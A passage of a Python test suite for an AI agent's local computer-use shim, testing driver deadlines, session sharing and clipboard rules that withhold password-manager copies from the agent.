    out without the size."""
    monkeypatch.setenv("FAKE_CUA_SCREEN", f'{{"width": {width}, "height": 1080}}')
    handler = make_handler()

    assert await handler.screen_size() is None


async def test_hello_skips_the_screen_size_rather_than_end_another_call(
    make_handler, fake_log, monkeypatch
) -> None:
    from autogpt_local_executor import handlers

    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    monkeypatch.setattr(handlers, "SCREEN_SIZE_SECONDS", 0.3)
    handler = make_handler()
    slow = asyncio.create_task(handler.handle(_call("drag", {"pid": -2})))
    for _ in range(250):
        if _records(fake_log, "call"):
            break
        await asyncio.sleep(0.02)

    size = await handler.screen_size()
    result = await slow

    assert size is None
    assert isinstance(result, ComputerToolResultMessage)
    assert _records(fake_log, "slow_done")


async def test_a_cancelled_call_is_still_audited(make_handler, tmp_path) -> None:
    handler = make_handler()
    task = asyncio.create_task(handler.handle(_call("drag", {"pid": -2})))
    await asyncio.sleep(1.0)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task

    [record] = _audit(tmp_path)
    assert record["result"]["error_code"] == "CANCELLED"


async def test_a_driver_that_cannot_start_is_reported(make_handler, monkeypatch) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "1.0.0")
    handler = make_handler()

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.DEPENDENCY_MISSING


# ── Clipboard rules ──────────────────────────────────────────────────────


async def test_clipboard_reads_return_this_shims_recent_write(make_handler) -> None:
    handler = make_handler(enable_clipboard=True)

    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))
    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "from the agent"


async def test_clipboard_reads_refuse_what_the_shim_did_not_write(make_handler, tmp_path) -> None:
    handler = make_handler(enable_clipboard=True)
    (tmp_path / "clipboard.txt").write_text("the person's password", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details == {"reason": "writeback_only"}
    assert "password" not in response.model_dump_json()


async def test_clipboard_reads_refuse_a_write_since_overwritten(make_handler, tmp_path) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))
    (tmp_path / "clipboard.txt").write_text("copied by the person", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details == {"reason": "writeback_overwritten"}


async def test_an_approved_file_on_the_clipboard_ends_the_shims_text_writeback(
    make_handler, tmp_path
) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "from the agent"}))

    response = await handler.handle(
        _call("clipboard_write", {"file_path": "/home/me/cv.pdf"}, approved_arguments=["file_path"])
    )
    read = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert isinstance(read, ErrorMessage)
    assert read.payload.details == {"reason": "writeback_only"}


async def test_clipboard_reads_ask_the_driver_for_the_text(make_handler, fake_log) -> None:
    handler = make_handler(enable_clipboard=True)
    await handler.handle(_call("clipboard_write", {"text": "x"}))

    await handler.handle(_call("clipboard_read", {"include_text": False}))

    read = [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]
    assert read[0]["arguments"]["include_text"] is True


@pytest.fixture
def a_clean_clipboard(monkeypatch: pytest.MonkeyPatch) -> list[concealed.ClipboardState]:
    """The OS's view of the clipboard, one state per look."""
    states: list[concealed.ClipboardState] = []
    from autogpt_local_executor import handlers

    def look(_timeout: float | None = None) -> concealed.ClipboardState:
        return states.pop(0) if states else concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", look)
    return states


async def test_foreign_clipboard_reads_return_unmarked_text(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "a copied paragraph"


@pytest.mark.parametrize("when", ["before", "after"])
async def test_foreign_clipboard_reads_refuse_a_password_managers_copy(
    make_handler, tmp_path, a_clean_clipboard, when: str
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("s3cret", encoding="utf-8")
    marked = concealed.ClipboardState("org.nspasteboard.ConcealedType", 7)
    clean = concealed.ClipboardState(None, 7)
    a_clean_clipboard.extend([marked] if when == "before" else [clean, marked])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details["marker"] == "org.nspasteboard.ConcealedType"
    assert "s3cret" not in response.model_dump_json()


async def test_foreign_clipboard_reads_check_the_types_the_driver_read(
    make_handler, tmp_path, a_clean_clipboard, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_CLIPBOARD_TYPES", "UTF8_STRING,x-kde-passwordManagerHint")
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("s3cret", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details["marker"] == "x-kde-passwordManagerHint"


async def test_foreign_clipboard_reads_refuse_a_copy_made_during_the_read(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("whatever", encoding="utf-8")
    a_clean_clipboard.extend([concealed.ClipboardState(None, 7), concealed.ClipboardState(None, 8)])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.details == {"reason": "changed"}


async def test_foreign_clipboard_reads_without_a_sequence_number_read_twice(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    """Linux keeps no clipboard sequence number, and cua-driver reads the
    types and then the text: a password manager's copy between the two,
    replaced before the shim looked again, came back as clean text."""
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    clipboard = tmp_path / "clipboard.txt"
    clipboard.write_text("s3cret", encoding="utf-8")  # read while its marker went unseen
    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])
    driver = handler.driver
    real_call = driver.call_tool

    async def call_tool(name: str, arguments: dict, **kwargs: Any) -> dict:
        result = await real_call(name, arguments, **kwargs)
        if name == "clipboard_read":
            clipboard.write_text("copied after it", encoding="utf-8")  # the clipboard moves on
        return result

    driver.call_tool = call_tool  # type: ignore[method-assign]

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CLIPBOARD_CONCEALED
    assert response.payload.details == {"reason": "changed"}
    assert "s3cret" not in response.model_dump_json()


async def test_a_second_read_that_finds_the_same_text_returns_it(
    make_handler, tmp_path, a_clean_clipboard
) -> None:
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")
    a_clean_clipboard.extend([concealed.ClipboardState(None), concealed.ClipboardState(None)])

    response = await handler.handle(_call("clipboard_read"))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.structured_content["text"] == "a copied paragraph"


async def test_a_clipboard_read_whose_deadline_passes_in_the_marker_check_never_starts(
    make_handler, tmp_path, fake_log, monkeypatch
) -> None:
    """The check for a password manager's marker (xclip or wl-paste, up to
    three seconds) ran before the driver's read, which still got the call's
    whole timeout, so the read could start after the deadline."""
    import time

    from autogpt_local_executor import handlers

    def slow_look(_timeout: float | None = None) -> concealed.ClipboardState:
        time.sleep(2)
        return concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", slow_look)
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read", timeout_seconds=1))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert response.payload.details["started"] is False
    assert [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"] == []


@pytest.mark.parametrize("stuck_look", ["before", "after"])
async def test_a_look_at_the_clipboard_not_back_by_the_deadline_ends_the_call(
    make_handler, tmp_path, fake_log, monkeypatch, stuck_look: str
) -> None:
    """The looks for a password manager's marker ran in a worker thread with
    no deadline on the wait: one queued behind threads that file work held,
    or one that hung, kept the call, and the computer's turn that every
    chat's calls share, past its deadline. A look not back by then ends the
    call: before the driver's read nothing ran, and after it what was read
    is withheld."""
    import threading

    from autogpt_local_executor import handlers

    released = threading.Event()
    looks = 0

    def look(_timeout: float | None = None) -> concealed.ClipboardState:
        nonlocal looks
        looks += 1
        if looks == (1 if stuck_look == "before" else 2):
            released.wait(timeout=60)
        return concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", look)
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")
    await handler.driver.snapshot()  # started, so the call's second goes to the look
    try:
        response = await asyncio.wait_for(
            handler.handle(_call("clipboard_read", timeout_seconds=1)), timeout=30
        )
    finally:
        released.set()

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert response.payload.details["started"] is (stuck_look == "after")
    assert "a copied paragraph" not in response.model_dump_json()
    reads = [r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]
    assert len(reads) == (1 if stuck_look == "after" else 0)


async def test_each_look_at_a_foreign_clipboard_gets_only_the_time_left(
    make_handler, tmp_path, monkeypatch
) -> None:
    """Each check for a password manager's marker could take its own three
    seconds (xclip, wl-paste) whatever the call's deadline, holding the
    computer's turn, which every chat's calls share, past it."""
    from autogpt_local_executor import handlers

    given: list[float | None] = []

    def look(timeout: float | None = None) -> concealed.ClipboardState:
        given.append(timeout)
        return concealed.ClipboardState(None, 7)

    monkeypatch.setattr(handlers, "clipboard_state", look)
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")

    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))

    assert isinstance(response, ComputerToolResultMessage)
    assert len(given) == 2
    assert all(timeout is not None and 0 < timeout <= 2 for timeout in given)


async def test_a_second_clipboard_read_never_starts_past_the_deadline(
    make_handler, tmp_path, fake_log, monkeypatch
) -> None:
    """On Linux the shim reads twice. A deadline that passed after the first
    read still started the second, given a millisecond, so it overran and
    the bridge stopped the driver every chat shares."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(
        handlers, "clipboard_state", lambda _timeout=None: concealed.ClipboardState(None)
    )
    handler = make_handler(enable_clipboard=True, enable_clipboard_read_foreign=True)
    (tmp_path / "clipboard.txt").write_text("a copied paragraph", encoding="utf-8")
    loop = asyncio.get_running_loop()
    deadlines: list[float] = []
    real_deadline = handlers.ComputerUseHandler.call_deadline

    def recorded_deadline(msg, received_at=None):
        deadlines.append(real_deadline(msg, received_at))
        return deadlines[-1]

    monkeypatch.setattr(
        handlers.ComputerUseHandler, "call_deadline", staticmethod(recorded_deadline)
    )
    real_call = handler.call_driver
    reads = 0

    async def first_read_runs_to_the_deadline(tool, arguments, **kwargs):
        nonlocal reads
        reads += 1
        result = await real_call(tool, arguments, **kwargs)
        if tool == "clipboard_read" and reads == 1:
            await asyncio.sleep(max(deadlines[0] - loop.time(), 0) + 0.2)
        return result

    monkeypatch.setattr(handler, "call_driver", first_read_runs_to_the_deadline)
    response = await handler.handle(_call("clipboard_read", timeout_seconds=2))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert response.payload.details["started"] is True
    assert "a copied paragraph" not in response.model_dump_json()
    assert len([r for r in _records(fake_log, "call") if r["tool"] == "clipboard_read"]) == 1
    assert "stopped cua-driver" not in response.payload.message


def test_marker_in_finds_each_platforms_marker() -> None:
    assert concealed.marker_in(["public.utf8-plain-text"]) is None
    assert concealed.marker_in(None) is None
    assert concealed.marker_in(["org.nspasteboard.ConcealedType"]) == (
        "org.nspasteboard.ConcealedType"
    )
    assert concealed.marker_in(["clipboard viewer ignore"]) == "clipboard viewer ignore"


@pytest.mark.parametrize(
    ("returncode", "stdout", "stderr", "marker"),
    [
        (0, "TARGETS\nUTF8_STRING\n", "", None),
        (0, "UTF8_STRING\nx-kde-passwordManagerHint\n", "", "x-kde-passwordManagerHint"),
        (1, "", "Error: target TARGETS not available", None),
        (1, "", "Error: Can't open display", concealed.UNKNOWN),
    ],
    ids=["plain", "password-manager", "empty", "broken"],
)
def test_linux_clipboard_state_reads_the_targets(
    monkeypatch, returncode: int, stdout: str, stderr: str, marker: str | None
) -> None:
    import subprocess

    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.delenv("WAYLAND_DISPLAY", raising=False)
    monkeypatch.setattr(concealed.shutil, "which", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(
        concealed.subprocess,
        "run",
        lambda argv, **_: subprocess.CompletedProcess(argv, returncode, stdout, stderr),
    )

    assert concealed._linux_state() == concealed.ClipboardState(marker)


def test_linux_clipboard_state_without_a_tool_counts_as_private(monkeypatch) -> None:
    monkeypatch.setenv("DISPLAY", ":0")
    monkeypatch.setattr(concealed.shutil, "which", lambda _name: None)

    assert concealed._linux_state().marker == concealed.UNKNOWN


# ── Sharing across sessions ──────────────────────────────────────────────


async def test_child_sessions_share_the_driver_and_only_the_parent_stops_it(
    make_handler, fake_log
) -> None:
    parent = make_handler(session_id=None)
    child = make_handler(session_id="child")
    parent.share_with(child)

    await child.handle(_call("click", {"pid": 1}))
    await parent.handle(_call("click", {"pid": 2}))
    assert child.driver is parent.driver
    assert len(_records(fake_log, "initialize")) == 1

    await child.close()
    assert parent.driver._client is not None and parent.driver._client.alive
    await parent.close()
    assert parent.driver._client is None


async def test_text_one_chat_wrote_is_readable_from_another(make_handler) -> None:
    """The clipboard is the computer's: a paste in any window shows another
    chat's write too, so the writeback record is shared, and the
    instructions say so rather than "this session"."""
    parent = make_handler(enable_clipboard=True, session_id=None)
    child = make_handler(enable_clipboard=True, session_id="child")
    parent.share_with(child)

    await parent.handle(_call("clipboard_write", {"text": "from the first chat"}))
    response = await child.handle(_call("clipboard_read"))
    listing = await child.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolResultMessage)
    assert (response.payload.structured_content or {})["text"] == "from the first chat"
    assert isinstance(listing, ComputerToolsResponseMessage)
    assert "in this chat or another" in listing.payload.instructions
    assert "this session" not in listing.payload.instructions


# ── Daemon ───────────────────────────────────────────────────────────────


async def test_a_child_session_waits_only_briefly_for_a_busy_shared_driver(
    tmp_path, fake_log, monkeypatch
) -> None:
    """The platform waits a few seconds (eight) for a chat's session to
    connect, then undoes the chat. A new chat's permission check waited up
    to 30 s for the shared driver, which another chat's call can hold far
    longer, and its HELLO up to 10 s more for the screen size."""
    from autogpt_local_executor import handlers, platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    await driver.snapshot()
    await driver._turn.acquire()  # another chat's call, running
    starting = asyncio.ensure_future(
        asyncio.gather(child._preflight_computer_use(), child._computer_handler.screen_size())
    )
    try:
        done, _ = await asyncio.wait({starting}, timeout=5)
        assert starting in done
        assert starting.result() == [None, None]
    finally:
        starting.cancel()
        driver._turn.release()
        await parent._computer_handler.close()


async def test_a_child_session_waits_only_briefly_for_a_screen_size_that_stalls(
    tmp_path, fake_log, monkeypatch
) -> None:
    """HELLO's wait bounded the screen-size probe only until the driver took
    it. A driver that took it and then stalled held a chat's HELLO for the
    probe's whole timeout, past the eight seconds the platform waits for a
    chat's session, for a size HELLO goes out without."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    monkeypatch.setattr(handlers, "SCREEN_SIZE_SECONDS", 60.0)
    monkeypatch.setenv("FAKE_CUA_SCREEN_SLOW_SECONDS", "60")
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    probe: asyncio.Future[tuple[int, int] | None] | None = None
    try:
        await parent._computer_handler.driver.snapshot()
        probe = asyncio.ensure_future(child._computer_handler.screen_size())
        done, _ = await asyncio.wait({probe}, timeout=10)
        assert probe in done
        assert probe.result() is None
    finally:
        if probe is not None:
            probe.cancel()
        await parent._computer_handler.close()


@pytest.mark.skipif(sys.platform == "win32", reason="Windows ends a process at once on terminate")
async def test_a_chats_hello_does_not_wait_for_a_stalled_driver_to_stop(
    tmp_path, fake_log, monkeypatch, linux_with_display
) -> None:
    """A screen-size probe out of time waited for its driver to be stopped,
    and a driver slow to go (terminated, then killed after two seconds, then
    waited for two more) held a chat's HELLO up to four seconds past the
    probe's two, past the eight the platform gives the session. HELLO goes
    on at the probe's deadline; the stop keeps the driver's turn until the
    old driver is gone, so no call starts another one meanwhile."""
    from autogpt_local_executor import handlers
    from autogpt_local_executor.computer_use import mcp_client

    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    monkeypatch.setattr(handlers, "SCREEN_SIZE_SECONDS", 60.0)
    monkeypatch.setattr(mcp_client, "KILL_GRACE_SECONDS", 60.0)
    monkeypatch.setenv("FAKE_CUA_SCREEN_SLOW_SECONDS", "60")
    monkeypatch.setenv("FAKE_CUA_IGNORE_TERM", "1")
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    bridge = parent._computer_handler.driver
    stalled: StdioMcpClient | None = None
    hello: asyncio.Future[Any] | None = None
    try:
        await bridge.snapshot()
        stalled = bridge._client
        assert stalled is not None and stalled._process is not None
        hello = asyncio.ensure_future(child._build_hello())
        done, _ = await asyncio.wait({hello}, timeout=30)

        assert hello in done
        assert "computer_use" in hello.result().payload.capabilities
        assert hello.result().payload.screen_resolution is None
        # The old driver is still being stopped, and keeps the turn.
        assert stalled._process.returncode is None
        assert bridge._turn.locked()
        stalled._process.kill()
        loop = asyncio.get_running_loop()
        until = loop.time() + 30
        while bridge._turn.locked():
            assert loop.time() < until, "the stop never let go of the driver's turn"
            await asyncio.sleep(0.01)
    finally:
        if hello is not None:
            hello.cancel()
        if stalled is not None and stalled._process is not None:
            with contextlib.suppress(ProcessLookupError):
                stalled._process.kill()
        await parent._computer_handler.close()


@pytest.mark.skipif(sys.platform == "win32", reason="Windows ends a process at once on terminate")
async def test_a_chats_permission_check_ends_within_its_wait_when_the_driver_stalls(
    tmp_path, fake_log, monkeypatch
) -> None:
    """A chat's permission check (macOS) waited for the shared driver only
    until the driver took it: one that took it and stalled held the chat's
    start for the check's 30 s, then for the driver's stop (terminated, then
    killed after two seconds, then waited for two more), past the eight
    seconds the platform gives a chat's session. The whole check fits in the
    chat's wait, and the session goes ahead unchecked, as it does when the
    driver is busy; the stop keeps the driver's turn until the old driver is
    gone, so no call starts another one meanwhile."""
    from autogpt_local_executor import daemon as daemon_module
    from autogpt_local_executor import handlers, platform_info
    from autogpt_local_executor.computer_use import mcp_client

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    monkeypatch.setattr(daemon_module, "PERMISSION_CHECK_SECONDS", 60.0)
    monkeypatch.setattr(mcp_client, "KILL_GRACE_SECONDS", 60.0)
    monkeypatch.setenv("FAKE_CUA_PERMISSIONS_SLOW_SECONDS", "60")
    monkeypatch.setenv("FAKE_CUA_IGNORE_TERM", "1")
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    bridge = parent._computer_handler.driver
    stalled: StdioMcpClient | None = None
    check: asyncio.Future[None] | None = None
    try:
        await bridge.snapshot()
        stalled = bridge._client
        assert stalled is not None and stalled._process is not None
        check = asyncio.ensure_future(child._preflight_computer_use())
        done, _ = await asyncio.wait({check}, timeout=30)

        assert check in done
        assert check.result() is None
        # The driver took the check, and is still being stopped.
        assert [r["tool"] for r in _records(fake_log, "call")] == ["check_permissions"]
        assert stalled._process.returncode is None
        assert bridge._turn.locked()
        stalled._process.kill()
        loop = asyncio.get_running_loop()
        until = loop.time() + 30
        while bridge._turn.locked():
            assert loop.time() < until, "the stop never let go of the driver's turn"
            await asyncio.sleep(0.01)
    finally:
        if check is not None:
            check.cancel()
        if stalled is not None and stalled._process is not None:
            with contextlib.suppress(ProcessLookupError):
                stalled._process.kill()
        await parent._computer_handler.close()


async def test_a_chat_attached_again_after_two_idle_detaches_passes_its_permission_check(
    tmp_path, fake_log, monkeypatch
) -> None:
    """On macOS a chat's session checks the app's grants through the shared
    driver as it starts. Its third session, after two idle detaches, got the
    driver's second session_ended refusal back from that check and took it
    for missing grants, so it exited before it connected, as every later one
    did until the driver restarted."""
    from autogpt_local_executor import handlers, platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    # A child's check waits briefly for the shared driver; a slow runner
    # must not skip it.
    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 60.0, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    driver = parent._computer_handler.driver
    ended = _ending_sessions(driver, monkeypatch)
    try:
        await driver.snapshot()
        for _ in range(3):
            child = _daemon(tmp_path, session_id="child-1")
            parent._computer_handler.share_with(child._computer_handler)
            await child._preflight_computer_use()
            # Left idle: the driver ends the label, then the session is detached.
            ended.add(child._computer_handler.session_label)
    finally:
        await parent._computer_handler.close()


async def test_a_child_hello_waits_only_briefly_for_a_driver_starting_again(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """A new chat's HELLO waited, without a deadline, for the shared driver
    to start again after another chat's call overran it, which can take a
    minute; the platform undoes a chat whose session isn't up in about
    eight seconds. It now goes on with the tools the driver last offered."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    await driver.snapshot()
    await driver._stop_client()  # stopped to end another chat's call
    await driver._lock.acquire()  # and starting again, slowly
    building = asyncio.ensure_future(child._build_hello())
    try:
        done, _ = await asyncio.wait({building}, timeout=10)
        assert building in done
        hello = building.result()
    finally:
        building.cancel()
        driver._lock.release()
        await parent._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))


async def test_the_owners_hello_waits_only_briefly_for_a_driver_starting_again(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """The control connection's HELLO waited, without a deadline, for its
    driver to start again after a chat's call overran it, which can take a
    minute; the platform closes a connection whose HELLO hasn't come in ten
    seconds. Once the driver has run, the owner's HELLO now goes on with the
    tools it last offered, as a chat's does."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    owner = _daemon(tmp_path, session_id=None)
    driver = owner._computer_handler.driver
    await driver.snapshot()
    await driver._stop_client()  # stopped to end a chat's call
    await driver._lock.acquire()  # and starting again, slowly
    building = asyncio.ensure_future(owner._build_hello())
    try:
        done, _ = await asyncio.wait({building}, timeout=10)
        assert building in done
        hello = building.result()
    finally:
        building.cancel()
        driver._lock.release()
        await owner._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))


def _daemon(tmp_path: Path, **overrides: Any):
    from autogpt_local_executor.daemon import ShimDaemon

    config = _config(tmp_path, cua_driver_path=str(FAKE), **overrides)
    audit = AuditWriter(config.audit_log_path, b"a" * 32)
    daemon = ShimDaemon(config, token_store=object(), audit=audit)
    daemon._computer_handler._driver = fake_bridge()
    return daemon


@pytest.fixture
def linux_with_display(monkeypatch: pytest.MonkeyPatch) -> None:
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "linux")
    monkeypatch.setenv("DISPLAY", ":0")


async def test_hello_names_the_driver_once_it_has_started(
    tmp_path, fake_log, linux_with_display
) -> None:
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    driver_info = hello.payload.computer_use_driver
    assert (driver_info.name, driver_info.version, driver_info.runtime) == (
        "cua-driver",
        "0.38.0",
        "direct",
    )
    assert hello.payload.screen_resolution == (1920, 1080)
    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))


async def test_hello_goes_out_when_the_driver_refuses_the_screen_size(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """A JSON-RPC error from get_screen_size escaped HELLO, so the handshake
    failed and the shim reconnected forever. The size is optional there."""
    monkeypatch.setenv("FAKE_CUA_RPC_ERROR", "get_screen_size")
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    assert hello.payload.screen_resolution is None


async def test_hello_leaves_out_computer_use_a_driver_cannot_serve(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.12.0")
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" not in hello.payload.capabilities
    assert hello.payload.computer_use_driver is None
    assert hello.payload.computer_use_tools == []
    assert hello.payload.screen_resolution is None


async def test_hello_without_computer_use_starts_no_driver(
    tmp_path, fake_log, linux_with_display
) -> None:
    daemon = _daemon(tmp_path, enable_computer_use=False)

    hello = await daemon._build_hello()

    assert hello.payload.computer_use_driver is None
    assert _records(fake_log, "initialize") == []


async def test_hello_goes_out_without_computer_use_while_the_look_for_the_driver_stalls(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """HELLO looked for the driver in a worker thread of its own each time
    and waited for it to the end, so a stalled mount on sys.path or PATH
    kept HELLO from going out: the machine couldn't connect, even for file
    work. The look is the bridge's, one at a time, within HELLO's wait now:
    past it HELLO goes out without computer use, a later HELLO waits for the
    same look rather than start another, and once the look has ended HELLO
    offers computer use again."""
    released = threading.Event()
    looks: list[str] = []
    find = driver.find_driver_binary

    def stalled(explicit: Any = None) -> Any:
        looks.append(str(explicit))
        released.wait(timeout=60)
        return find(explicit)

    monkeypatch.setattr(driver, "find_driver_binary", stalled)
    monkeypatch.setattr(handlers_module, "DRIVER_LOOKUP_SECONDS", 0.5, raising=False)
    daemon = _daemon(tmp_path)
    try:
        first = await asyncio.wait_for(daemon._build_hello(), timeout=30)
        again = await asyncio.wait_for(daemon._build_hello(), timeout=30)
        assert len(looks) == 1
        released.set()
        later = await asyncio.wait_for(daemon._build_hello(), timeout=30)
    finally:
        released.set()
        await daemon._computer_handler.close()

    for hello in (first, again):
        assert "files" in hello.payload.capabilities
        assert "computer_use" not in hello.payload.capabilities
        assert hello.payload.computer_use_driver is None
    assert "computer_use" in later.payload.capabilities


def _stall_the_look(monkeypatch: pytest.MonkeyPatch, *, installed: bool = True):
    """Make the look for the driver stall until the event returned is set,
    then find it, or not; returns the event and the list of looks made."""
    released = threading.Event()
    looks: list[int] = []
    find = driver.find_driver_binary

    def stalled(explicit: Any = None) -> Any:
        looks.append(threading.get_ident())
        released.wait(timeout=60)
        return find(explicit) if installed else None

    monkeypatch.setattr(driver, "find_driver_binary", stalled)
    return released, looks


@pytest.mark.parametrize("installed", [True, False])
async def test_a_start_whose_look_for_the_driver_stalls_goes_on_to_connect(
    tmp_path, fake_log, linux_with_display, monkeypatch, installed: bool
) -> None:
    """A start waited for the look for the driver to the end before it
    connected, so a stalled mount on PATH or sys.path kept the machine
    offline, file and shell work too, and HELLO's own bounded wait never
    came into it. The start waits DRIVER_PREFLIGHT_SECONDS for the look now
    and goes on; another start waits for the same look rather than start
    one more, and HELLO offers computer use once the look has found the
    driver, and not if it found none."""
    from autogpt_local_executor import daemon as daemon_module

    released, looks = _stall_the_look(monkeypatch, installed=installed)
    monkeypatch.setattr(daemon_module, "DRIVER_PREFLIGHT_SECONDS", 0.2, raising=False)
    monkeypatch.setattr(handlers_module, "DRIVER_LOOKUP_SECONDS", 0.2, raising=False)
    daemon = _daemon(tmp_path, session_id=None)
    try:
        await asyncio.wait_for(daemon._preflight_or_raise(), timeout=30)
        await asyncio.wait_for(daemon._preflight_or_raise(), timeout=30)
        assert len(looks) == 1
        meanwhile = await asyncio.wait_for(daemon._build_hello(), timeout=30)
        released.set()
        later = await asyncio.wait_for(daemon._build_hello(), timeout=30)
    finally:
        released.set()
        await daemon._computer_handler.close()

    assert "files" in meanwhile.payload.capabilities
